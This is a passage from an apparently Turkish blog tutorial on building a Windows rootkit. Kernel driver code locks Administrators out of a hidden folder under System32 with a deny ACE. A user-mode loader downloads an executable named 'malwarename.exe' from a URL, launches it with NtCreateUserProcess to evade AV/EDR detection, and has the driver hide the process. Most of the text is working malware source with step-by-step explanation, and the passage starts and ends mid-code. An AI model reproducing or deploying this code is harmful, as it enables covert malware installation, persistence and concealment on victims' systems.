ExportDirectory-\u003eAddressOfNameOrdinals); Functions = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfFunctions); for (ULONG i = 0; i \u003c ExportDirectory-\u003eNumberOfNames; i++) { CurrentFunction = (PCSTR)((PUCHAR)KernelBaseAddress + Names[i]); if (strcmp(CurrentFunction, TargetFunctionName) == 0) { TargetOrdinal = Ordinals[i]; FoundFuncAddress = (PVOID)((PUCHAR)KernelBaseAddress + Functions[TargetOrdinal]); DbgPrintEx(0, 0, \"[+] Function %s found at 0x%p Address!\\n\", TargetFunctionName, FoundFuncAddress); return FoundFuncAddress; } } DbgPrintEx(0, 0, \"[-] %s not Found in Export Table!\\n\", TargetFunctionName); return NULL; } Evet geldik önemli kısma.\nİlk olarak DosHeader değişkenine kernel base adresini atıyoruz. Daha sonra bu adresin geçerli olup olmadığını kontrol etmek için bazı kontroller yapıyoruz. Kontrol etmemizin sebebi ise kernel base adresinin geçerli olup olmadığını kontrol etmektir. Unutmayın, kernel alanındayız. Detaylı kontroller yapmamız sürücü için faydalı olacaktır.\nİlk kontrolde DosHeader-\u003ee_magic değerini kontrol ediyoruz. Eğer bu değer IMAGE_DOS_SIGNATURE değerine eşit değilse hata döndürüyoruz. IMAGE_DOS_SIGNATURE değeri, dosyanın geçerli bir DOS başlığına sahip olup olmadığını kontrol etmek için kullanılır. Eğer DosHeader-\u003ee_magic değeri IMAGE_DOS_SIGNATURE ile uyuşmuyorsa, bu dosyanın geçersiz olduğu anlamına gelir ve sürücüde hata döndürülür. Buradaki amaç, kernel alanında çalıştığımız için geçersiz veya bozulmuş bir adresle işlem yapmanın önüne geçmektir.\nEğer bu kontrol başarıyla geçilirse, bir sonraki adımda NT başlığını (NT Header) kontrol ediyoruz. NTHeader değişkenine, kernel base adresine ek olarak DOS başlığındaki e_lfanew offset’ini ekleyerek NT başlığının adresini elde ediyoruz. Bu da bize, PE dosya formatına ait NT yapısının başlangıç noktasını verecektir.\nKontrolde NTHeader-\u003eSignature değeri kontrol edilir. Bu değer IMAGE_NT_SIGNATURE ile aynı değilse, yine bir hata mesajı döndürülür ve fonksiyon sonlandırılır. IMAGE_NT_SIGNATURE değeri, PE formatının geçerli olup olmadığını kontrol etmek için kullanılır. Başka bir deyişle, dosyanın gerçekten bir PE (Portable Executable) dosyası olup olmadığını doğrularız.\nDaha sonra ExportDirectoryRVA değişkenine, NTHeader yapısındaki OptionalHeader yapısındaki IMAGE_DIRECTORY_ENTRY_EXPORT değerini atıyoruz. Bu değer, dosyanın içindeki export tablosunun adresini tutar. Eğer bu değer 0 ise, export tablosu bulunamadığı için hata döndürülerek return ettirilir.\nExportDirectory değişkenine, kernel base adresine ExportDirectoryRVA değerini ekleyerek export tablosunun adresini alıyoruz. Eğer bu değer NULL ise, export tablosu bulunamadığı için hata döndürülür ve return edilir.\nNames = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfNames); Ordinals = (PUSHORT)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfNameOrdinals); Functions = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfFunctions); for (ULONG i = 0; i \u003c ExportDirectory-\u003eNumberOfNames; i++) { CurrentFunction = (PCSTR)((PUCHAR)KernelBaseAddress + Names[i]); if (strcmp(CurrentFunction, TargetFunctionName) == 0) { TargetOrdinal = Ordinals[i]; FoundFuncAddress = (PVOID)((PUCHAR)KernelBaseAddress + Functions[TargetOrdinal]); DbgPrintEx(0, 0, \"[+] Function %s found at 0x%p Address!\\n\", TargetFunctionName, FoundFuncAddress); return FoundFuncAddress; } } DbgPrintEx(0, 0, \"[-] %s not Found in Export Table!\\n\", TargetFunctionName); Bu kısım da ise export tablosundan sırasıyla aşağıdaki bilgileri elde ediyoruz:\nNames: Export tablosundaki fonksiyon isimleri. Ordinals: Export tablosundaki fonksiyonların sıra numaraları. Functions: Export tablosundaki fonksiyonların adresleri. Bu bilgileri kullanarak hedef fonksiyonumuzun adresini buluyor olacağız.\nDaha sonra bir döngü oluşturuyoruz. Bu döngüde, export tablosundaki fonksiyon isimlerini sırasıyla kontrol ediyoruz. Eğer döngü sırasında kontrol edilen isim, hedef fonksiyon ismi ile eşleşirse bu durumda hedef fonksiyonun sıra numarasını alıyoruz ve bu sıra numarası ile fonksiyonun adresini alıyoruz ve kısa bir bilgilendirme mesajı ile fonksiyon adresini ekrana bastırıyoruz.\nAslında fonksiyona yakındından baktığımızda çok zor değil. Sadece export table verilerini alarak bir döngü oluşturuyoruz ve hedef fonksiyonun ismini bularak adresini elde ediyoruz. Her şey bundan ibaret. MmGetSystemRoutineAddress API’in işlevi gibi düşünebilirsiniz.\nInitializeObjectAttributes(\u0026ObjAttr, \u0026ImagePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); Status = ZwOpenFile(\u0026HandleFile, READ_CONTROL | WRITE_DAC, \u0026ObjAttr, \u0026IoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE); if (!NT_SUCCESS(Status)) { return Status; } RtlAccessDeniedAceEx’in adresini aldıktan sonra gizli klasörün bilgileri içeren bir OBJECT_ATTRIBUTES oluşturuyoruz ve ZwOpenFile ile bu klasörü açıyoruz. Amacımız dosya handle almak.\nSecurityDescriptor = ExAllocatePoolWithTag(PagedPool, SECURITY_DESCRIPTOR_MIN_LENGTH, 'Secd'); if (NULL == SecurityDescriptor) { ZwClose(HandleFile); return STATUS_INSUFFICIENT_RESOURCES; } Status = RtlCreateSecurityDescriptor(SecurityDescriptor, SECURITY_DESCRIPTOR_REVISION); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } Daha sonra PSECURITY_DESCRIPTOR yapısından oluşturduğumuz SecurityDescrictor değişkeninde SECURITY_DESCRIPTOR_MIN_LENGTH boyutunda bir alan ayırıyoruz. Bu alan, bir güvenlik tanımlayıcısını temsil eder.\nDaha sonra RtlCreateSecurityDescriptor API’si ile, ayırdığımız bellek bloğuna bir güvenlik tanımlayıcısı (security descriptor) başlatıyoruz. Bu API, oluşturduğunuz güvenlik tanımlayıcısının ilk ayarlarını yapar ve SECURITY_DESCRIPTOR_REVISION sabiti ile bu güvenlik tanımlayıcısının sürümünü belirtiriz.\n/* Include Admin and User */ RtlInitializeSid(\u0026AdminSidStatic, \u0026NtAuthority, 2); *RtlSubAuthoritySid(\u0026AdminSidStatic, 0) = SECURITY_BUILTIN_DOMAIN_RID;\t*RtlSubAuthoritySid(\u0026AdminSidStatic, 1) = DOMAIN_ALIAS_RID_ADMINS; AdminSid = \u0026AdminSidStatic; AclSize = sizeof(ACL) + sizeof(ACCESS_DENIED_ACE) - sizeof(ULONG) + RtlLengthSid(AdminSid); Acl = ExAllocatePoolWithTag(PagedPool, AclSize, 'ACLT'); if (NULL == Acl) { ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return STATUS_INSUFFICIENT_RESOURCES; } Status = RtlCreateAcl(Acl, AclSize, ACL_REVISION); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } İlk olarak, Admin SID ve ACL (Erişim Kontrol Listesi) oluşturuyoruz. Ardından ACCESS_DENIED_ACE (erişim reddi girişi) ekleyerek, belirli kullanıcıların (bu durumda Admin grubunun) bu klasöre erişimini engellemeye hazırlıyoruz.\nDaha sonra RtlCreateAcl API’si ile, bir ACL yapısı oluşturuyoruz. Bu API, bir erişim kontrol listesi (ACL) oluşturur ve bu ACL yapısını başlatır. Bu API, ACL_REVISION sabiti ile ACL yapısının sürümünü belirtir.\nStatus = fp_RtlAddAccessDeniedAceEx(Acl, ACL_REVISION, OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE, CurrentAccessMask, AdminSid); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } Status = RtlSetDaclSecurityDescriptor(SecurityDescriptor, TRUE, Acl, FALSE); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } Status = ZwSetSecurityObject(HandleFile, DACL_SECURITY_INFORMATION, SecurityDescriptor); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; RtlAddAccessDeniedAceEx API’si ile, bir erişim reddi ACE’si ekleriz. Bu API, bir erişim reddi ACE’si ekler ve bu ACE yapısını başlatır. Yani bu API ile verilen yetkiler ile (bu yetkiler CurrentAccessMask değişkeninde tutulur) Admin grubunun bu klasöre erişimini engelleriz.\nDaha sonra RtlSetDaclSecurityDescriptor API’si ile, bir güvenlik tanımlayıcısına bir DACL (discretionary access control list) ekleriz. Bu API, bir güvenlik tanımlayıcısına bir DACL ekler ve bu DACL yapısını başlatıyoruz.\nSon olarak ZwSetSecurityObject API’si ile, bir nesnenin güvenlik bilgilerini ayarlıyoruz. Bu API, bir nesnenin güvenlik bilgilerini ayarlar ve bu nesnenin güvenlik bilgilerini başlatır. Yani bu API ile klasörün güvenlik bilgilerini ayarlamış oluyoruz ve işlemlerimiz tamamlanmış oluyor.\nUser Mode Program Artık kernel driver’ın neler yaptığını biliyoruz. Şimdi ise user-mode programımızı inceleyelim:\n#include \"main.h\" NTSTATUS CreateTargetProcess(UNICODE_STRING ImagePath, PHANDLE HandlePtr) { PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL; PPS_ATTRIBUTE_LIST AttrList; PS_CREATE_INFO CreateInfo = { 0 }; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; NTSTATUS Status; Status = RtlCreateProcessParametersEx(\u0026ProcessParameters, \u0026ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \\ RTL_USER_PROCESS_PARAMETERS_NORMALIZED); if (!NT_SUCCESS(Status)) { return Status; } CreateInfo.Size = sizeof(CreateInfo); CreateInfo.State = PsCreateInitialState; AttrList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)); AttrList-\u003eTotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE); AttrList-\u003eAttributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME; AttrList-\u003eAttributes[0].Size = ImagePath.Length; AttrList-\u003eAttributes[0].Value = (ULONG_PTR)ImagePath.Buffer; Status = NtCreateUserProcess(\u0026HandleProcess, \u0026HandleThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, \\ \u0026CreateInfo, AttrList); if (!NT_SUCCESS(Status)) { RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return Status; } *HandlePtr = HandleProcess; RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return STATUS_SUCCESS; } BOOLEAN ConnectDriver(DWORD DwIoControlCode, LPVOID InBuffer, DWORD InBufferSize, LPVOID* OutBuffer, DWORD OutBufferSize) { HANDLE HandleDevice = NULL; DWORD BytesReturned = 0; BOOL Result; HandleDevice = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL); if (NULL == HandleDevice) { return FALSE; } Result = DeviceIoControl(HandleDevice, DwIoControlCode, InBuffer, InBufferSize, OutBuffer, OutBufferSize, \u0026BytesReturned, NULL); if (!Result) { CloseHandle(HandleDevice); return FALSE; } CloseHandle(HandleDevice); return TRUE; } BOOLEAN DownloadExecutable(const CHAR* url, const CHAR* filePath) { HINTERNET hInternet = NULL, hUrl = NULL; HANDLE hFile = INVALID_HANDLE_VALUE; BYTE buffer[4096]; DWORD bytesRead = 0, bytesWritten = 0; BOOLEAN result = FALSE; hInternet = InternetOpenA(\"WinINet Example\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); if (hInternet == NULL) { printf(\"Failed to open internet session. Error: %lu\\n\", GetLastError()); return FALSE; } hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0); if (hUrl == NULL) { printf(\"Failed to open URL. Error: %lu\\n\", GetLastError()); InternetCloseHandle(hInternet); return FALSE; } hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { printf(\"[-] Failed to create file. Error: %lu\\n\", GetLastError()); InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return FALSE; } while (InternetReadFile(hUrl, buffer, sizeof(buffer), \u0026bytesRead) \u0026\u0026 bytesRead \u003e 0) { if (!WriteFile(hFile, buffer, bytesRead, \u0026bytesWritten, NULL)) { printf(\"Failed to write to file. Error: %lu\\n\", GetLastError()); CloseHandle(hFile); InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return FALSE; } } result = TRUE; CloseHandle(hFile); InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return result; } BOOLEAN IsProcessRunning(DWORD ProcessID) { HANDLE HandleProcessSnap = NULL; PROCESSENTRY32 PE32; BOOL Status = FALSE; HandleProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == HandleProcessSnap) { return FALSE; } PE32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(HandleProcessSnap, \u0026PE32)) { CloseHandle(HandleProcessSnap); return FALSE; } do { if (PE32.th32ProcessID == ProcessID) { Status = TRUE; break; } } while (Process32Next(HandleProcessSnap, \u0026PE32)); CloseHandle(HandleProcessSnap); return Status; } BOOLEAN MonitorProcess(DWORD ProcessID) { BOOL IsRunning = IsProcessRunning(ProcessID); int CheckInvertal = 5000; printf(\"[*] Listening Process... (PID: %lu)\\n\", ProcessID); while (IsRunning) { Sleep(CheckInvertal); IsRunning = IsProcessRunning(ProcessID); if (!IsRunning) { printf(\"[-] Process Terminated!\\n\"); break; } } return IsRunning; } int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\\n\"); return -1; } CHAR ExecutablePath[0x80] = \"C:\\\\Windows\\\\System32\\\\HiddenFile\"; CHAR ExecutableName[0x80] = \"malwarename.exe\"; CHAR ExecutableUrl[0x80] = \"https://url\"; DWORD CurrentPID = atoi(argv[1]); ULONG_PTR d_PID = (ULONG_PTR)strtoul(argv[1], NULL, 10); CHAR PathForUnicode[0x80]; HANDLE HandleNewProcess = NULL; HANDLE ProcessID = NULL; DWORD Error; BOOL Result; UNICODE_STRING ImagePath; WCHAR UnicodeExecutablePath[256]; NTSTATUS Status; Result = MonitorProcess(CurrentPID); if (!Result) { Result = ConnectDriver(IOCTL_CREATE_DIRECTORY, NULL, 0, NULL, 0); if (!Result) { Error = GetLastError(); if (Error != ERROR_ALREADY_EXISTS) { printf(\"Failed to Create Directory! Error Code: 0x%lx\\n\", Error); return -1; } } printf(\"[*] Directory Path: %s\\n\", ExecutablePath); int result = snprintf(ExecutablePath, sizeof(ExecutablePath), \"%s\\\\%s\", ExecutablePath, ExecutableName); if (result \u003c 0 || result \u003e= sizeof(ExecutablePath)) { printf(\"Failed to construct full path!\\n\"); return -1; } printf(\"[*] Malware Path: %s\\n\", ExecutablePath); Result = DownloadExecutable(ExecutableUrl, ExecutablePath); if (!Result) { Error = GetLastError(); if (Error != ERROR_ALREADY_EXISTS) { printf(\"[-] Failed to Download Executable! Error Code: 0x%lx\\n\", GetLastError()); return -1; } printf(\"[*] The executable is already downloaded.\\n\"); } else { printf(\"[+] The Executable Downloaded!\\n\"); } snprintf(PathForUnicode, sizeof(PathForUnicode), \"\\\\??\\\\%s\", ExecutablePath); MultiByteToWideChar(CP_ACP, 0, PathForUnicode, -1, UnicodeExecutablePath, 256); RtlInitUnicodeString(\u0026ImagePath, UnicodeExecutablePath); Status = CreateTargetProcess(ImagePath, \u0026HandleNewProcess); if (!NT_SUCCESS(Status)) { printf(\"[-] Failed to Create Process! NTSTATUS Code: 0x%08X\\n\", Status); return -1; } ProcessID = (HANDLE)(ULONG_PTR)GetProcessId(HandleNewProcess); printf(\"[*] Created Process! Process ID: %lu\\n\", (ULONG)(ULONG_PTR)ProcessID); Result = ConnectDriver(IOCTL_HIDE_PROCESS, \u0026ProcessID, sizeof(ULONG_PTR), NULL, 0); if (!Result) { printf(\"[-] Failed to Hide The Process! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleNewProcess); return -1; } printf(\"[+] The Process has been Hidden!\\n\"); } CloseHandle(HandleNewProcess); return 0; } User-mode programımızın kodları da bu şekilde. Şimdi detaylıca göz atalım:\nif (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\\n\"); return -1; } CHAR ExecutablePath[0x80] = \"C:\\\\Windows\\\\System32\\\\HiddenFile\"; CHAR ExecutableName[0x80] = \"malwarename.exe\"; CHAR ExecutableUrl[0x80] = \"https://url\"; main içerisinde ilk olarak bir kontrol ile başlıyoruz. Bu kontrol, programın başlatılma esnasında parametre verip vermediğini kontrol eden bir kontrol yapısıdır. Eğer parametre verilmediyse programın nasıl kullanılacağına dair bir bilgi verir ve programı sonlandırır.\nDaha sonra malware’in düzgün bir şekilde çalışması için gerekli olan değişkenleri tanımlıyoruz. İşte işlevleri:\nExecutablePath: Malware’in indirileceği ve çalıştırılacağı klasörün yolu. ExecutableName: Malware’in adı. ExecutableUrl: Malware’in indirileceği URL. Result = MonitorProcess(CurrentPID); if (!Result) { Result = ConnectDriver(IOCTL_CREATE_DIRECTORY, NULL, 0, NULL, 0); if (!Result) { Error = GetLastError(); if (Error != ERROR_ALREADY_EXISTS) { printf(\"Failed to Create Directory! Error Code: 0x%lx\\n\", Error); return -1; } } printf(\"[*] Directory Path: %s\\n\", ExecutablePath); Daha sonra MonitorProcess ile sistemde çalışan malware’i dinlemeye alıyoruz. Eğer bu fonksiyonun sonucu 0 yani FALSE olursa bu durumda malware’in çalışmadığını anlarız ve işlemlere başlarız.\nDaha sonra oluşturduğumuz ConnectDriver aracılığıyla sürücümüze IOCTL_CREATE_DIRECTORY kodunu göndererek gizli klasörü oluşturması için talimat gönderiyoruz. ConnectDriver fonksiyonunda DeviceIoControl aracılığıyla kodumuzu sürücüye iletir. Eğer bu işlem başarısız olursa hata kodunu ekrana bastırıyoruz ve programı sonlandırıyoruz, ancak sonlandırmadan alınan hata kodunu ERROR_ALREADY_EXISTS ile karşılaştırarak, eğer bu hata kodu ile aynıysa bu durumda klasörün zaten oluşturulduğunu anlarız ve işlemlere devam ederiz.\nint result = snprintf(ExecutablePath, sizeof(ExecutablePath), \"%s\\\\%s\", ExecutablePath, ExecutableName); if (result \u003c 0 || result \u003e= sizeof(ExecutablePath)) { printf(\"Failed to construct full path!\\n\"); return -1; } printf(\"[*] Malware Path: %s\\n\", ExecutablePath); Daha sonnra snprintf ile ExecutablePath değişkenine ExecutableName değişkenin değerini ekleyerek malware’in tam yolunu oluşturuyoruz (şuan ki program sonucuna göre C:\\Windows\\System32\\HiddenFile\\malwarename.exe olacaktır). Eğer bu işlem başarısız olursa hata mesajı vererek programı sonlandırıyoruz.\nResult = DownloadExecutable(ExecutableUrl, ExecutablePath); if (!Result) { Error = GetLastError(); if (Error != ERROR_ALREADY_EXISTS) { printf(\"[-] Failed to Download Executable! Error Code: 0x%lx\\n\", GetLastError()); return -1; } printf(\"[*] The executable is already downloaded.\\n\"); } else { printf(\"[+] The Executable Downloaded!\\n\"); } Daha sonra DownloadExecutable fonksiyonunu çağırarak malware’i indiriyoruz. Bu fonksiyonda wininet kullanılarak dosya indirme işlemi gerçekleştirilir. Eğer bu işlem başarısız olursa hata mesajını bastırmadan önce verilen hatayı ERROR_ALREADY_EXISTS ile karşılaştırarak, eğer bu hata kodu ile aynıysa bu durumda dosyanın zaten indirildiğini anlarız ve işlemlere devam ederiz.\nsnprintf(PathForUnicode, sizeof(PathForUnicode), \"\\\\??\\\\%s\", ExecutablePath); MultiByteToWideChar(CP_ACP, 0, PathForUnicode, -1, UnicodeExecutablePath, 256); RtlInitUnicodeString(\u0026ImagePath, UnicodeExecutablePath); Status = CreateTargetProcess(ImagePath, \u0026HandleNewProcess); if (!NT_SUCCESS(Status)) { printf(\"[-] Failed to Create Process! NTSTATUS Code: 0x%08X\\n\", Status); return -1; } Daha sonra ExecutablePath değişkenini PathForUnicode değişkenine başına ‘\\??\\’ prefix ile kopyalayarak, bu değişkeni WCHAR bir tipine dönüştürüyoruz. Buradaki amacımız tam elde ettiğimiz malware yolunu UNICODE_STRING’e çevirmek ve Process oluşturması için CreateTargetProcess fonksiyona iletmek.\nDaha sonra RtlInitUnicodeString fonksiyonu ile UnicodeExecutablePath değişkenini ImagePath değişkenine dönüştürüyoruz ve CreateTargetProcess fonksiyonuna bu değişkeni ve HandleNewProcess değişkenini ileterek yeni bir process oluşturmasını sağlıyoruz.\nNTSTATUS CreateTargetProcess(UNICODE_STRING ImagePath, PHANDLE HandlePtr) { Status = RtlCreateProcessParametersEx(\u0026ProcessParameters, \u0026ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \\ RTL_USER_PROCESS_PARAMETERS_NORMALIZED); if (!NT_SUCCESS(Status)) { return Status; } CreateInfo.Size = sizeof(CreateInfo); CreateInfo.State = PsCreateInitialState; Evet önemli kısımlardan birine geldik; process’in oluşturulması.\nMuhtemelen şu soruyu sorabilirsiniz, “Kernel sürücüden destek alıyorsun ama user-mode programda NT API kullanıyorsun” diye. Haklısınız aslında.\nBu projeyi ilk geliştirmeye başladığımda Kernel-mode sürücüde ZwCreateProcess’i bularak oluşturmayı ve farklı birçok yöntem denedim ve ancak maalesef benim için hiçbiri sonuç vermedi. Sonradan şunu öğrendim ki ZwCreateProcessEx gibi API’lar kernel seviyesinde process oluşturulmak için kullanıldığını öğrendim. Sonralarda Microwave90 kullanıcısının hazırladığı kernel tabanlı sürücü projesinde çalıştırdığı NtCreateUserProcess gibi yöntemleri denememe rağmen başarısız oldum.\nDaha sonra araştırmalarımda Capt. Meelo’nun hazırladığı user-mode uygulamada NtCreateUserProcess çalıştırdığı bloguna denk geldim ve açıkçası kodlar benim için çok faydalı oldu ve bu yüzden process oluşturma işlemini user-mode programıma eklemeye karar verdim.\nNTSTATUS CreateTargetProcess(UNICODE_STRING ImagePath, PHANDLE HandlePtr) { PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL; PPS_ATTRIBUTE_LIST AttrList; PS_CREATE_INFO CreateInfo = { 0 }; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; NTSTATUS Status; Status = RtlCreateProcessParametersEx(\u0026ProcessParameters, \u0026ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \\ RTL_USER_PROCESS_PARAMETERS_NORMALIZED); if (!NT_SUCCESS(Status)) { return Status; } CreateInfo.Size = sizeof(CreateInfo); CreateInfo.State = PsCreateInitialState; AttrList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)); AttrList-\u003eTotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE); AttrList-\u003eAttributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME; AttrList-\u003eAttributes[0].Size = ImagePath.Length; AttrList-\u003eAttributes[0].Value = (ULONG_PTR)ImagePath.Buffer; Status = NtCreateUserProcess(\u0026HandleProcess, \u0026HandleThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, \\ \u0026CreateInfo, AttrList); if (!NT_SUCCESS(Status)) { RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return Status; } *HandlePtr = HandleProcess; RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return STATUS_SUCCESS; } User-mode alanında CreateProcess kullandığınızda aşağıdaki dönüşümler gerçekleşir:\nİlk olarak kernel32 içerisinden CreateProcessInternal çağırılır ve ardından ntdll.dll içerisinden NtCreateUserProcess ve son olarak kernel-mode alanına girerek ntoskrnl.exe’den NtCreateUserProcess çağırılır. Burada NtCreateUserProcess kullanma sebebimiz ise Capt. Meelo’nun makalede belirttiği gibi AV/EDR tespit kontrollerinden kaçmak için kullanılabilecek en düşük seviye API’dir.\nAncak fark ettiyseniz kodda direkt olarak NtCreateUserProcess çağırmıyoruz. Ondan önce bazı adımları tamamlamamız ve ardından NtCreateUserProcess çağırmamız gerekiyor. Çünkü Windows, process oluşturulurken bazı parametrelerin belirtilmesini bekler. Bu parametrelerin başında RTL_USER_PROCESS_PARAMETERS ve PS_ATTRIBUTE_LIST gelir.\nStatus = RtlCreateProcessParametersEx(\u0026ProcessParameters, \u0026ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED); if (!NT_SUCCESS(Status)) { return Status; } RTL_USER_PROCESS_PARAMETERS yapısını oluşturmak için RtlCreateProcessParameterEx aracılığıyla parametreleri hazırlıyoruz. Bu yapı şu şekildedir:\nNTSTATUS NTAPI RtlCreateProcessParametersEx( _Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters, _In_ PUNICODE_STRING ImagePathName, _In_opt_ PUNICODE_STRING DllPath, _In_opt_ PUNICODE_STRING CurrentDirectory, _In_opt_ PUNICODE_STRING CommandLine, _In_opt_ PVOID Environment, _In_opt_ PUNICODE_STRING WindowTitle, _In_opt_ PUNICODE_STRING DesktopInfo, _In_opt_ PUNICODE_STRING ShellInfo, _In_opt_ PUNICODE_STRING RuntimeData, _In_ ULONG Flags ); pProcessParameters yapısı, PRTL_USER_PROCESS_PARAMETERS türünde bir pointer’dır ve işlevin çağrıldığında işlevin oluşturduğu RTL_USER_PROCESS_PARAMETERS yapısının adresini alır. Bu yapı, oluşturulacak process’in parametrelerini belirler. Bu yüzden ilk olarak process’in parametreleri ayarlamamız ve son olarak process’i oluşturmamız gerekiyor.\nOluşturulacak process’in yolunu UNICODE_STRING tipinde olan ImagePath değişkeni ile belirtiyoruz.\nCreateInfo.Size = sizeof(CreateInfo); CreateInfo.State = PsCreateInitialState; AttrList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)); AttrList-\u003eTotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE); AttrList-\u003eAttributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME; AttrList-\u003eAttributes[0].Size = ImagePath.Length; AttrList-\u003eAttributes[0].Value = (ULONG_PTR)ImagePath.Buffer; Bu işlemlerden sonra oluşturduğumuz PS_CREATE_INFO ve PS_ATTRIBUTE_LIST yapılarını NtCreateUserProcess fonksiyonuna ileterek process’i oluşturmasını sağlıyoruz.\nPS_CREATE_INFO için internette çok fazla bilgi yok. Açıkçası bu yapının tam olarak ne işe yaradığını bilmiyorum.\nPS_ATTRIBUTE_LIST yapısından devam edecek olursak, bu yapı, process oluşturulurken belirli özelliklerin belirtilmesini sağlar. Bu yapıda, process’in adı, boyutu ve değeri gibi bilgileri belirtiriz.\nStatus = NtCreateUserProcess(\u0026HandleProcess, \u0026HandleThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, \\ \u0026CreateInfo, AttrList); if (!NT_SUCCESS(Status)) { RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return Status; } Bu yapıları tamamladıktan sonra NtCreateUserProcess fonksiyonunu çağırarak process oluşturma işlemini başlatıyoruz. Bu yapı şu şekilde:\nNTSTATUS NTAPI NtCreateUserProcess( _Out_ PHANDLE ProcessHandle, _Out_ PHANDLE ThreadHandle, _In_ ACCESS_MASK ProcessDesiredAccess, _In_ ACCESS_MASK ThreadDesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes, _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes, _In_ ULONG ProcessFlags, _In_ ULONG ThreadFlags, _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters, _Inout_ PPS_CREATE_INFO CreateInfo, _In_ PPS_ATTRIBUTE_LIST AttributeList ); Dİğer parametrelerin yanı sıra PRTL_USER_PROCESS_PARAMETERS, PPS_CREATE_INFO ve PS_ATTRIBUTE_LIST yapılarını aldığını dikkat etmemiz gerek. Bu yapılarla beraber diğer parametreleri de belirterek process oluşturma işlemini başlatmış oluyoruz.\nProcessID = (HANDLE)(ULONG_PTR)GetProcessId(HandleNewProcess); printf(\"[*] Created Process! Process ID: %lu\\n\", (ULONG)(ULONG_PTR)ProcessID); Result = ConnectDriver(IOCTL_HIDE_PROCESS, \u0026ProcessID, sizeof(ULONG_PTR), NULL, 0); if (!Result) { printf(\"[-] Failed to Hide The Process! Error Code: 0x%lx\\n\", 